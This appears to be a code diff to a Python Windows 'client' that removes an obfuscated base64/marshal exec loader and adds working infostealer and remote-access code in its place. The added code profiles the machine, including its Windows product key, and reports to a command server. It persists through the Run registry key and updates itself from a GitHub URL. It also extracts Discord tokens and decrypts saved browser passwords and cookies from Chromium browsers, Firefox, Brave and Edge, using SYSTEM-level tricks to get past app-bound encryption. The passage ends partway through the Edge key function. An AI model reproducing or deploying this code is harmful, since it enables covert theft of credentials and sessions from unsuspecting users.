+gyxjfetsOLNY3ikb7Ku/ALkMGBhFVUc5jd252MfichlvRQzouH1XnNNxtR+y4SFFuI0QiR8Wei8saM3GR0HmK8jzbZH3Da7SCkq/nt3GvKuMwfA3wG0H/BmDr7KL+5b8Smn9qZvgEoyHQLiI4A3K38IuFTm24k1L33rmGlJwg415Q788a9Q2K+qkzsTt70EtOCzpye7tgoTd35LONjgR440ngRcXGlMQHUleq3iB1ZeRljP8P3Ukwql9TqxHqUg23eqYNobRV2zk3d9w2/JZvCvjDTuT/nUxLzR2IHhyVAka6/gvSRITJgJVJ6f5RwZY9Ue+kecHtr9W1n6fQPnxHiJ3autYyytklZPjbu7eXoLW1QZ8xgq0tTFoNHQv8KfXvDUbIlJpWbmfU3UIxx9Gse0VqD/kCkgF51V2U0woISxrBfSPwVK3n8fFDZ84eHj90NkNx7Z88dGJNi2+yPr0yhVKp/IdGXUkv7L14VF7n97Q3VG1u6BHR0H6xT7mPMZ+TuLMk7UxFjiXLKvot4CJsaLLR8ikoi+rBp6gTZ2lBCEA9gh9hQ+okAfCNz1s3durkyUMTRzKnT504Uf9CGOK76pRiea1t2MPhKZcKBfrgz4UjJERrU6yEf0NX6cO/zUeUW+zUQh9+dxDziuF27L2IhwPRWp0TnpnKyv9o63pemwiisOxuNy/bNE1ibKF4sCiWFtlq68VaxVpBchC0FpFWCEoXWkzTOoktevCqdz15Ey+CZw/ixZvgwYu3iiie2v9AUajzfW930moS8iXsTuZHsvvmMfPe96Ua8SltvvGyzKVRUXJARpUv0jPaXLFzWWMrRGTR5IS1qctrmyp9uyV3E9NMGvZo6XLSnlVdYz3XXdNjeWUJsyLLfc6l8iIIRgl2zaSn0gIgp6jX04AbU/GU8jxZXWvuUF44pbTgzfNCe3t6X5dNjF/7FGAC386lDZpxHDqJQ71goU/7+68+8hiDslLZ5j1LMR2N86lMZtucdTp9uaVko3m/0diz3VbOFEOtG2adiSy/xt79A+lQ6ZDVzbbbU+/sjPPKKmZLo3YM1j9B8Ng2Suy4cJBx3lXKtdlYuROvJu3bXNYZxVlq0Z13M93hjP53Id9exhorRAkvOlYMcmH4gEcAkkpuOD/sgstVoD1iXB0CN0zsMieqrHq11Yo1yql//cF6C85frOLtymBJwzYGOAH4gmM/9i2HLETXZ+dqV+frl2pzpuYCAz+gyQLgle6RY0dycmKhr9YCN+FMcwa5J0oXckszJ/Qfrm/qJQk1d3MNcCOb+NXCcr3lHuAh4DHgKeAZ4CUTwgBvAG8B7wDvAYgsMR+df/oV8A3wHQB5eSqiU41aU0iYl8JsFHKXDDhqwjgjJVACZtIzP3Hshc8dE0mH7eS1c4Q7fnE3l7jjDdM5du5vV+eY5o2Ge8QZOlhaWh3ephQKcBLflNrq0by9cJ4XFjnmTFtpprtZAplW2SIQwBxowbgKGDU98gf6ZOT0lbHjSEDCOS/KBL654h3+ivIav1j0i7asMEaxQpblgCpYwgyEqnJ5/CxEeEcbyGCQohTCc8Jv/f+suk+FFFXnHjhkWyv4uhYS/gkkTHsU/hYpMS+CI/DAPKpZA7aVfBRYDKVfIumTkuRl0H46JkflppRlSA7ZM/0yIjlbypcxqUTHbZmy9PDVG5WKszItB+WMxFFReiW2pRMZRpS/DMuUrXPQ1l4VfeSinFxhnWWpYaT2JbaWwAuwt4A+Zb+XhtSUGNdZoe5YlvEQdfI3fDwrvi3J2SfYDe3ogk9/AQekuGQ='
-sGAxnohw = zlib.decompress(base64.b64decode(aGguVubQ))
-gwqGYEHd = marshal.loads(sGAxnohw)
-exec(gwqGYEHd)
+import time
+import threading
+import ctypes
+import tempfile
+import shutil
+import sqlite3
+import re
+import configparser
+import binascii
+import socket
+from datetime import datetime, timedelta, timezone
+import requests
+import psutil
+import win32crypt
+import pyperclip
+from Crypto.Cipher import AES
+import mss
+import mss.tools
+from pypsexec.client import Client
+
+# ========== CONFIGURATION DU CLIENT ==========
+SERVER_URL = "http://127.0.0.1:5000"
+HEARTBEAT_INTERVAL = 300
+COMMAND_POLL_INTERVAL = 5
+
+CLIENT_VERSION_URL = "https://raw.githubusercontent.com/Paladu13/test/main/client_version"
+CLIENT_UPDATE_URL = "https://raw.githubusercontent.com/Paladu13/test/main/client.pyw"
+
+SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
+CONFIG_FILE = os.path.join(SCRIPT_DIR, "client_config.txt")
+
+PATHS = {
+    'Discord': os.getenv('APPDATA') + '\\discord',
+    'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
+    'Lightcord': os.getenv('APPDATA') + '\\Lightcord',
+    'Discord PTB': os.getenv('APPDATA') + '\\discordptb',
+}
+
+BROWSER_PROCESS_NAMES = {
+    'opera':    ['opera.exe'],
+    'operagx':  ['opera.exe', 'operagx.exe'],
+    'brave':    ['brave.exe'],
+    'edge':     ['msedge.exe'],
+    'firefox':  ['firefox.exe']
+}
+
+EXCLUDE_DOMAINS = ['.msn.com', 'assets.msn.com', 'ntp.msn.com', 'srtb.msn.com']
+IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0
+MACHINE_ID = None
+
+# ========== FONCTIONS DE CONFIGURATION LOCALE ==========
+def load_client_config():
+    if not os.path.exists(CONFIG_FILE):
+        return {}
+    try:
+        with open(CONFIG_FILE, 'r') as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_client_config(cfg):
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(cfg, f)
+
+def get_client_config(key, default=None):
+    return load_client_config().get(key, default)
+
+def set_client_config(key, value):
+    cfg = load_client_config()
+    cfg[key] = value
+    save_client_config(cfg)
+
+# ========== ID MACHINE ==========
+def get_machine_id():
+    global MACHINE_ID
+    if MACHINE_ID:
+        return MACHINE_ID
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
+        MACHINE_ID = winreg.QueryValueEx(key, "MachineGuid")[0]
+        winreg.CloseKey(key)
+        return MACHINE_ID
+    except:
+        MACHINE_ID = os.getenv('COMPUTERNAME', 'unknown')
+        return MACHINE_ID
+
+# ========== FONCTIONS SYSTÈME ==========
+def format_bytes(n):
+    if n == 0:
+        return "0 B"
+    units = ['B','KB','MB','GB','TB']
+    i = 0
+    while n >= 1024 and i < len(units)-1:
+        n /= 1024.0
+        i += 1
+    return f"{n:.1f} {units[i]}"
+
+def get_public_ip():
+    try:
+        r = requests.get('https://api.ipify.org?format=json', timeout=5)
+        return r.json().get('ip', 'Unknown')
+    except:
+        pass
+    try:
+        r = requests.get('https://api.my-ip.io/ip', timeout=5)
+        return r.text.strip()
+    except:
+        pass
+    return 'Unknown'
+
+def get_all_ips():
+    ips = {'ipv4': [], 'ipv6': []}
+    try:
+        hostname = socket.gethostname()
+        for info in socket.getaddrinfo(hostname, None):
+            addr = info[4][0]
+            if ':' in addr:
+                if addr not in ips['ipv6']:
+                    ips['ipv6'].append(addr)
+            else:
+                if addr not in ips['ipv4'] and not addr.startswith('127.'):
+                    ips['ipv4'].append(addr)
+    except:
+        pass
+    return ips
+
+def get_mac_address():
+    try:
+        import uuid
+        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
+                        for elements in range(0, 48, 8)][::-1])
+        return mac.upper()
+    except:
+        return "Unknown"
+
+def get_windows_key():
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
+        digital_product_id = winreg.QueryValueEx(key, "DigitalProductId")[0]
+        winreg.CloseKey(key)
+        key_offset = 52
+        chars = "BCDFGHJKMPQRTVWXY2346789"
+        product_key = ""
+        data = list(digital_product_id[key_offset:key_offset+15])
+        for i in range(24, -1, -1):
+            r = 0
+            for j in range(14, -1, -1):
+                r = (r * 256) ^ data[j]
+                data[j] = r // 24
+                r %= 24
+            product_key = chars[r] + product_key
+            if i % 5 == 0 and i != 0:
+                product_key = '-' + product_key
+        return product_key
+    except:
+        return None
+
+def get_cpu_info():
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
+        cpu_name = winreg.QueryValueEx(key, "ProcessorNameString")[0]
+        winreg.CloseKey(key)
+        return cpu_name.strip()
+    except:
+        return "Unknown"
+
+def get_gpu_info():
+    gpus = []
+    try:
+        result = subprocess.run(
+            ['wmic', 'path', 'win32_VideoController', 'get', 'name'],
+            capture_output=True, text=True, timeout=10,
+            creationflags=0x08000000
+        )
+        lines = result.stdout.strip().split('\n')
+        for line in lines[1:]:
+            name = line.strip()
+            if name and name not in gpus:
+                gpus.append(name)
+    except:
+        pass
+    if not gpus:
+        try:
+            import winreg
+            i = 0
+            while True:
+                try:
+                    key_path = f"SYSTEM\\CurrentControlSet\\Control\\Class\\{{4d36e968-e325-11ce-bfc1-08002be10318}}\\{str(i).zfill(4)}"
+                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                    try:
+                        driver_desc = winreg.QueryValueEx(key, "DriverDesc")[0]
+                        if driver_desc and driver_desc not in gpus:
+                            gpus.append(driver_desc)
+                    except:
+                        pass
+                    winreg.CloseKey(key)
+                    i += 1
+                except:
+                    break
+        except:
+            pass
+    return gpus if gpus else ["Unknown"]
+
+def get_motherboard_info():
+    try:
+        result = subprocess.run(
+            ['wmic', 'baseboard', 'get', 'Manufacturer,Product,Version', '/format:csv'],
+            capture_output=True, text=True, timeout=10,
+            creationflags=0x08000000
+        )
+        lines = result.stdout.strip().split('\n')
+        if len(lines) >= 3:
+            data_line = lines[2] if len(lines) > 2 else lines[1]
+            parts = data_line.split(',')
+            if len(parts) >= 4:
+                return {
+                    'manufacturer': parts[1].strip() if parts[1].strip() else 'Unknown',
+                    'product': parts[2].strip() if parts[2].strip() else 'Unknown',
+                    'version': parts[3].strip() if parts[3].strip() else 'N/A'
+                }
+    except:
+        pass
+    return {'manufacturer': 'Unknown', 'product': 'Unknown', 'version': 'N/A'}
+
+def get_bios_info():
+    bios_vendor = "Unknown"
+    bios_version = "Unknown"
+    bios_date = ""
+    try:
+        result = subprocess.run(
+            ['wmic', 'bios', 'get', 'Manufacturer,SMBIOSBIOSVersion,ReleaseDate', '/format:csv'],
+            capture_output=True, text=True, timeout=10,
+            creationflags=0x08000000
+        )
+        lines = result.stdout.strip().split('\n')
+        if len(lines) >= 3:
+            data_line = lines[2] if len(lines) > 2 else lines[1]
+            parts = data_line.split(',')
+            if len(parts) >= 4:
+                manufacturer = parts[1].strip()
+                version = parts[2].strip()
+                release_date = parts[3].strip()
+                if manufacturer:
+                    bios_vendor = manufacturer
+                if version:
+                    bios_version = version
+                if release_date:
+                    try:
+                        dt = datetime.strptime(release_date[:8], '%Y%m%d')
+                        bios_date = dt.strftime('%d/%m/%Y')
+                    except:
+                        bios_date = release_date
+                if bios_vendor != "Unknown" and bios_version != "Unknown":
+                    return f"{bios_vendor} {bios_version} ({bios_date})" if bios_date else f"{bios_vendor} {bios_version}"
+    except:
+        pass
+    if bios_version != "Unknown":
+        return bios_version
+    return "Unknown"
+
+def get_default_browser():
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice")
+        browser_id = winreg.QueryValueEx(key, "Progid")[0]
+        winreg.CloseKey(key)
+        browser_names = {
+            'ChromeHTML': 'Google Chrome',
+            'MSEdgeHTM': 'Microsoft Edge',
+            'FirefoxURL': 'Mozilla Firefox',
+            'OperaStable': 'Opera',
+            'BraveHTML': 'Brave'
+        }
+        return browser_names.get(browser_id, browser_id)
+    except:
+        return "Unknown"
+
+def get_antivirus():
+    av_list = []
+    try:
+        result = subprocess.run(
+            ['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName'],
+            capture_output=True, text=True, timeout=10,
+            creationflags=0x08000000
+        )
+        lines = result.stdout.strip().split('\n')
+        for line in lines[1:]:
+            name = line.strip()
+            if name and name not in av_list:
+                av_list.append(name)
+    except:
+        pass
+    return av_list if av_list else ["Aucun détecté"]
+
+def get_windows_version():
+    try:
+        import platform
+        import winreg
+        ver = platform.win32_ver()
+        release = ver[0]
+        build = ver[1]
+        edition = ""
+        try:
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
+            edition = winreg.QueryValueEx(key, "EditionID")[0]
+            winreg.CloseKey(key)
+        except:
+            pass
+        if edition:
+            return f"Windows {release} {edition} (Build {build.split('.')[-1]})"
+        else:
+            return f"Windows {release} (Build {build.split('.')[-1]})"
+    except:
+        return "Unknown"
+
+def get_disk_usage():
+    try:
+        usage = psutil.disk_usage('/')
+        return {
+            'total': usage.total,
+            'free': usage.free,
+            'used': usage.used,
+            'percent': usage.percent,
+            'total_str': format_bytes(usage.total),
+            'free_str': format_bytes(usage.free),
+            'used_str': format_bytes(usage.used)
+        }
+    except:
+        return {'total':0,'free':0,'used':0,'percent':0}
+
+def get_memory_info():
+    try:
+        mem = psutil.virtual_memory()
+        return {
+            'total': mem.total,
+            'available': mem.available,
+            'used': mem.used,
+            'percent': mem.percent,
+            'total_str': format_bytes(mem.total),
+            'available_str': format_bytes(mem.available),
+            'used_str': format_bytes(mem.used)
+        }
+    except:
+        return {'total':0,'available':0,'used':0,'percent':0}
+
+def get_system_info():
+    disk = get_disk_usage()
+    ram = get_memory_info()
+    local_ips = get_all_ips()
+    public_ip = get_public_ip()
+    motherboard = get_motherboard_info()
+    gpus = get_gpu_info()
+    antivirus = get_antivirus()
+    
+    client_version = get_client_config('version', 'unknown')
+    last_update = get_client_config('last_update', datetime.now(timezone.utc).isoformat())
+    
+    return {
+        'machine_id': get_machine_id(),
+        'computer_name': os.getenv('COMPUTERNAME', ''),
+        'username': os.getenv('USERNAME', ''),
+        'windows_version': get_windows_version(),
+        'windows_key': get_windows_key(),
+        'hwid': get_machine_id(),
+        'ip_public': public_ip,
+        'ip': public_ip,
+        'ipv4': local_ips.get('ipv4', []),
+        'ipv6': local_ips.get('ipv6', []),
+        'mac_address': get_mac_address(),
+        'cpu': get_cpu_info(),
+        'gpu': gpus,
+        'motherboard': motherboard,
+        'bios_version': get_bios_info(),
+        'default_browser': get_default_browser(),
+        'antivirus': antivirus,
+        'disk': disk,
+        'ram': ram,
+        'client_version': client_version,
+        'last_update': last_update,
+        'timestamp': datetime.now(timezone.utc).isoformat()
+    }
+
+# ========== AUTO‑UPDATE ==========
+def get_remote_version():
+    try:
+        r = requests.get(CLIENT_VERSION_URL, timeout=5)
+        return r.text.strip() if r.status_code == 200 else None
+    except:
+        return None
+
+def get_local_version():
+    return get_client_config('version')
+
+def set_local_version(ver):
+    set_client_config('version', ver)
+
+def perform_client_update():
+    remote = get_remote_version()
+    local = get_local_version()
+    if not remote or remote == local:
+        return False
+    try:
+        r = requests.get(CLIENT_UPDATE_URL, timeout=15)
+        if r.status_code != 200:
+            return False
+        
+        current_script = os.path.abspath(sys.argv[0])
+        
+        with open(current_script, 'wb') as f:
+            f.write(r.content)
+        
+        set_local_version(remote)
+        set_client_config('last_update', datetime.now(timezone.utc).isoformat())
+        
+        pythonw_path = sys.executable
+        if not pythonw_path.lower().endswith('pythonw.exe'):
+            alt_path = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
+            if os.path.exists(alt_path):
+                pythonw_path = alt_path
+        
+        time.sleep(1)
+        subprocess.Popen(
+            [pythonw_path, current_script],
+            creationflags=0x08000000,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+            close_fds=True,
+            shell=False
+        )
+        os._exit(0)
+        
+    except:
+        return False
+
+# ========== PERSISTANCE ==========
+def ensure_startup_persistence():
+    try:
+        import winreg
+        
+        pythonw_path = sys.executable
+        if pythonw_path.lower().endswith('python.exe'):
+            alt_path = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
+            if os.path.exists(alt_path):
+                pythonw_path = alt_path
+        
+        script_path = os.path.abspath(sys.argv[0])
+        reg_cmd = f'"{pythonw_path}" "{script_path}"'
+        
+        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            reg_path,
+            0,
+            winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(key, "WindowsClientAgent", 0, winreg.REG_SZ, reg_cmd)
+        winreg.CloseKey(key)
+    except:
+        pass
+
+# ========== FONCTIONS CLIENT (COMMANDES) ==========
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    }
+    if token:
+        headers["Authorization"] = token
+    return headers
+
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
+    if not os.path.exists(path):
+        return tokens
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and not file.endswith(".log"):
+            continue
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except:
+            continue
+    return tokens
+
+def getkey(path):
+    with open(path + "\\Local State", "r") as f:
+        key = json.load(f)['os_crypt']['encrypted_key']
+    return key
+
+def kill_browser_process(browser_key):
+    if browser_key not in BROWSER_PROCESS_NAMES:
+        return
+    procs = [p.info for p in psutil.process_iter(['pid', 'name']) if p.info['name']]
+    for name in BROWSER_PROCESS_NAMES[browser_key]:
+        for proc in procs:
+            if proc['name'].lower() == name.lower():
+                try:
+                    psutil.Process(proc['pid']).terminate()
+                except:
+                    pass
+        try:
+            subprocess.call(f"taskkill /f /im {name} /t", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
+        except:
+            pass
+    time.sleep(2)
+
+def chrome_date_to_str(d):
+    if d <= 0:
+        return "Session"
+    return (datetime(1601, 1, 1) + timedelta(microseconds=d)).strftime("%Y-%m-%d %H:%M:%S")
+
+def get_browser_encryption_key(base_path):
+    local_state = os.path.join(base_path, "Local State")
+    if not os.path.exists(local_state):
+        return None
+    try:
+        with open(local_state, "r", encoding="utf-8") as f:
+            encrypted_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except:
+        return None
+
+def decrypt_value(enc_value, key):
+    if not key or not enc_value:
+        return None
+    try:
+        if enc_value[:3] in (b'v10', b'v11', b'v20'):
+            cipher = AES.new(key, AES.MODE_GCM, nonce=enc_value[3:15])
+            decrypted = cipher.decrypt_and_verify(enc_value[15:-16], enc_value[-16:])
+            if len(decrypted) > 32:
+                return decrypted[32:].decode(errors="ignore")
+            else:
+                return decrypted.decode(errors="ignore")
+        else:
+            return win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode(errors="ignore")
+    except:
+        return None
+
+def extract_chromium_browser(browser_name, base_path, key_func=None):
+    result = {'passwords': [], 'cookies': []}
+    if not os.path.exists(base_path):
+        return result
+    key = key_func(base_path) if key_func else get_browser_encryption_key(base_path)
+    if not key:
+        return result
+    profiles = []
+    default_path = os.path.join(base_path, "Default")
+    if os.path.exists(os.path.join(default_path, "Login Data")):
+        profiles.append(("Default", default_path))
+    for item in os.listdir(base_path):
+        if item.startswith("Profile "):
+            prof_path = os.path.join(base_path, item)
+            if os.path.exists(os.path.join(prof_path, "Login Data")):
+                profiles.append((item, prof_path))
+    for profile_name, profile_path in profiles:
+        login_db = os.path.join(profile_path, "Login Data")
+        if os.path.exists(login_db):
+            try:
+                tmp = tempfile.NamedTemporaryFile(delete=False)
+                tmp.close()
+                shutil.copy2(login_db, tmp.name)
+                conn = sqlite3.connect(tmp.name)
+                for url, user, pwd in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
+                    if user or pwd:
+                        password = decrypt_value(pwd, key) if pwd else ""
+                        if password:
+                            result['passwords'].append({
+                                'browser': browser_name,
+                                'profile': profile_name,
+                                'url': url,
+                                'username': user,
+                                'password': password
+                            })
+                conn.close()
+                os.unlink(tmp.name)
+            except:
+                pass
+        cookie_path = os.path.join(profile_path, "Network", "Cookies")
+        if os.path.exists(cookie_path):
+            try:
+                tmp = tempfile.NamedTemporaryFile(delete=False)
+                tmp.close()
+                shutil.copy2(cookie_path, tmp.name)
+                conn = sqlite3.connect(tmp.name)
+                for host, name, path, enc_val, expires, secure, httponly in conn.execute(
+                    "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies"):
+                    val = decrypt_value(enc_val, key)
+                    if val:
+                        result['cookies'].append({
+                            'browser': browser_name,
+                            'profile': profile_name,
+                            'host': host,
+                            'name': name,
+                            'value': val,
+                            'path': path,
+                            'expires': chrome_date_to_str(expires),
+                            'secure': bool(secure),
+                            'httponly': bool(httponly)
+                        })
+                conn.close()
+                os.unlink(tmp.name)
+            except:
+                pass
+    return result
+
+class NSSProxy:
+    class SECItem(ctypes.Structure):
+        _fields_ = [("type", ctypes.c_uint), ("data", ctypes.c_char_p), ("len", ctypes.c_uint)]
+        def decode_data(self):
+            return ctypes.string_at(self.data, self.len).decode('utf-8')
+    class PK11SlotInfo(ctypes.Structure):
+        pass
+    def __init__(self):
+        self.libnss = None
+        nssname = "nss3.dll"
+        locations = ["", "C:\\Program Files\\Mozilla Firefox", "C:\\Program Files (x86)\\Mozilla Firefox"]
+        for loc in locations:
+            nsslib = os.path.join(loc, nssname)
+            if not os.path.exists(nsslib):
+                continue
+            os.environ["PATH"] = ";".join([loc, os.environ["PATH"]])
+            workdir = os.getcwd()
+            try:
+                os.chdir(loc)
+                self.libnss = ctypes.CDLL(nsslib)
+                break
+            finally:
+                os.chdir(workdir)
+        if self.libnss is None:
+            raise Exception("NSS not found")
+        for name, restype, *argtypes in [
+            ("NSS_Init", ctypes.c_int, ctypes.c_char_p),
+            ("NSS_Shutdown", ctypes.c_int),
+            ("PK11_GetInternalKeySlot", ctypes.POINTER(self.PK11SlotInfo)),
+            ("PK11_FreeSlot", None, ctypes.POINTER(self.PK11SlotInfo)),
+            ("PK11_NeedLogin", ctypes.c_int, ctypes.POINTER(self.PK11SlotInfo)),
+            ("PK11_CheckUserPassword", ctypes.c_int, ctypes.POINTER(self.PK11SlotInfo), ctypes.c_char_p),
+            ("PK11SDR_Decrypt", ctypes.c_int, ctypes.POINTER(self.SECItem), ctypes.POINTER(self.SECItem), ctypes.c_void_p),
+            ("SECITEM_ZfreeItem", None, ctypes.POINTER(self.SECItem), ctypes.c_int)
+        ]:
+            res = getattr(self.libnss, name)
+            res.argtypes = argtypes
+            res.restype = restype
+            setattr(self, "_" + name, res)
+    def initialize(self, profile):
+        self._NSS_Init(("sql:" + profile).encode('utf-8'))
+    def shutdown(self):
+        self._NSS_Shutdown()
+    def authenticate(self, profile):
+        keyslot = self._PK11_GetInternalKeySlot()
+        try:
+            if self._PK11_NeedLogin(keyslot):
+                self._PK11_CheckUserPassword(keyslot, b"")
+        finally:
+            self._PK11_FreeSlot(keyslot)
+    def decrypt(self, data64):
+        data = binascii.a2b_base64(data64)
+        inp = self.SECItem(0, data, len(data))
+        out = self.SECItem(0, None, 0)
+        try:
+            self._PK11SDR_Decrypt(inp, out, None)
+            return out.decode_data()
+        finally:
+            self._SECITEM_ZfreeItem(out, 0)
+
+def get_firefox_profiles():
+    base_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
+    profiles = []
+    profileini = os.path.join(base_path, "profiles.ini")
+    if not os.path.isfile(profileini):
+        return []
+    config = configparser.ConfigParser()
+    config.read(profileini, encoding='utf-8')
+    for section in config.sections():
+        if section.startswith("Profile"):
+            name = config.get(section, "Name", fallback="Unknown")
+            path = config.get(section, "Path")
+            full_path = os.path.join(base_path, path)
+            if config.get(section, "IsRelative", fallback='1') == '0':
+                full_path = path
+            if os.path.exists(full_path):
+                profiles.append((name, full_path))
+    return profiles
+
+def extract_firefox_data():
+    result = {'passwords': [], 'cookies': []}
+    kill_browser_process('firefox')
+    time.sleep(2)
+    profiles = get_firefox_profiles()
+    for profile_name, profile_path in profiles:
+        try:
+            if not os.path.exists(os.path.join(profile_path, "key4.db")) or not os.path.exists(os.path.join(profile_path, "cert9.db")):
+                continue
+            moz = NSSProxy()
+            moz.initialize(profile_path)
+            moz.authenticate(profile_name)
+            logins_json = os.path.join(profile_path, "logins.json")
+            if os.path.exists(logins_json):
+                with open(logins_json, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                for entry in data.get("logins", []):
+                    try:
+                        user = moz.decrypt(entry["encryptedUsername"])
+                        pwd = moz.decrypt(entry["encryptedPassword"])
+                        if user and pwd:
+                            result['passwords'].append({
+                                'browser': 'Firefox',
+                                'profile': profile_name,
+                                'url': entry.get("hostname"),
+                                'username': user,
+                                'password': pwd
+                            })
+                    except:
+                        pass
+            cookie_db = os.path.join(profile_path, "cookies.sqlite")
+            if os.path.exists(cookie_db):
+                tmp = tempfile.NamedTemporaryFile(delete=False)
+                tmp.close()
+                shutil.copy2(cookie_db, tmp.name)
+                conn = sqlite3.connect(tmp.name)
+                cur = conn.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
+                for host, name, value, path, expiry, secure, httponly in cur:
+                    if value:
+                        result['cookies'].append({
+                            'browser': 'Firefox',
+                            'profile': profile_name,
+                            'host': host,
+                            'name': name,
+                            'value': value,
+                            'path': path,
+                            'expires': datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S') if expiry else 'Session',
+                            'secure': bool(secure),
+                            'httponly': bool(httponly)
+                        })
+                conn.close()
+                os.unlink(tmp.name)
+            moz.shutdown()
+        except:
+            pass
+    return result
+
+def get_brave_app_bound_key(local_state_path):
+    if not os.path.exists(local_state_path) or not IS_ADMIN:
+        return None
+    try:
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
+        if not app_bound_encrypted_key:
+            return None
+        decrypt_script = """
+import win32crypt, binascii
+encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
+print(binascii.b2a_base64(encrypted_key[1]).decode())
+"""
+        c = Client("localhost")
+        c.connect()
+        c.create_service()
+        app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
+        if app_bound_key[:4] == b"APPB":
+            app_bound_key = app_bound_key[4:]
+        app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
+        encrypted_key_b64, _, rc = c.run_executable(
+            sys.executable,
+            arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
+            use_system_account=True
+        )
+        if rc != 0:
+            return None
+        decrypted_key_b64, _, rc = c.run_executable(
+            sys.executable,
+            arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
+            use_system_account=False
+        )
+        if rc != 0:
+            return None
+        decrypted_key = binascii.a2b_base64(decrypted_key_b64)
+        if len(decrypted_key) < 32:
+            return None
+        return decrypted_key[-32:]
+    except:
+        return None
+    finally:
+        try: c.remove_service()
+        except: pass
+        c.disconnect()
+
+def extract_brave_data():
+    if not IS_ADMIN:
+        return {'passwords': [], 'cookies': []}
+    brave_path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data')
+    if not os.path.exists(brave_path):
+        return {'passwords': [], 'cookies': []}
+    kill_browser_process('brave')
+    key = get_brave_app_bound_key(os.path.join(brave_path, 'Local State'))
+    if not key:
+        key = get_browser_encryption_key(brave_path)
+    if not key:
+        return {'passwords': [], 'cookies': []}
+    return extract_chromium_browser('Brave', brave_path, lambda x: key)
+
+def wait_for_file_unlock(file_path, max_attempts=10):
+    for _ in range(max_attempts):
+        try:
+            test_path = file_path + ".test"
+            shutil.copy2(file_path, test_path)
+            os.remove(test_path)
+            return True
+        except:
+            time.sleep(2)
+    return False
+
+def get_edge_app_bound_key(local_state_path):
+    if not os.path.exists(local_state_path) or not IS_ADMIN:
+        return None
+    try:
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
+        if not app_bound_encrypted_key:
+            return None
+        decrypt_script = """
+import win32crypt, binascii
+encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
+print(binascii.b2a_base64(encrypted_key[1]).decode())
+"""
+        c = Client("localhost")
+        c.connect()
+        c.create_service()
+        app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
+        if app_bound_key[:4] == b"APPB":
+            app_bound_key = app_bound_key[4:]
+        app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
+        encrypted_key_b64, _, rc = c.run_executable(
+            sys.executable,
+            arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
+            use_system_account=True
+        )
+        if rc != 0:
+            return None
+        decrypted_key_b64, _, rc = c.run_executable(
+            sys.executable,
+            arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
+            use_system_account=False
+        )
+        if rc != 0:
+            return None
+        decrypted_key = binascii.a2b_base64(decrypted_key_b64)
+        if len(decrypted_key) < 32:
+            return None
+        return decrypted_key[-32:]
+    except:
+        return None
+    finally:
+        try: c.remove_service()
+        except: pass
+        c.disconnect()
+
+def get_standard_edge_key(edge_user_data_path):
+    local_state = os.path.join(edge_user_data_path, "Local State")
